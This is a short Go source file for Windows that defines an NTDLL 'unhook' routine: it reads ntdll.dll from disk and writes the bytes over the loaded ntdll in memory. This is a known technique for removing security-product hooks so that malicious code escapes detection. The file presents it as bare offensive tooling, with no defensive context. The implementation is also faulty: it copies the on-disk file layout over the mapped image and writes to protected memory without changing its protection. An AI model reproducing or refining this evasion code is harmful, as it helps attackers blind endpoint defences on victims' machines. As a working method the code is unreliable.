//go:build windows

package syscall

import (
"golang.org/x/sys/windows"
"os"
"unsafe"
)

type NTDLLUnhook struct{}

func NewNTDLLUnhook() *NTDLLUnhook {
return &NTDLLUnhook{}
}

func (n *NTDLLUnhook) Unhook() error {
ntdllPath := "C:\\Windows\\System32\\ntdll.dll"
data, err := os.ReadFile(ntdllPath)
if err != nil {
return err
}

ntdll, err := windows.LoadDLL("ntdll.dll")
if err != nil {
return err
}

ntdllBase := ntdll.Handle
ntdllData := (*[1 << 30]byte)(unsafe.Pointer(ntdllBase))
for i := 0; i < len(data); i++ {
ntdllData[i] = data[i]
}
return nil
}
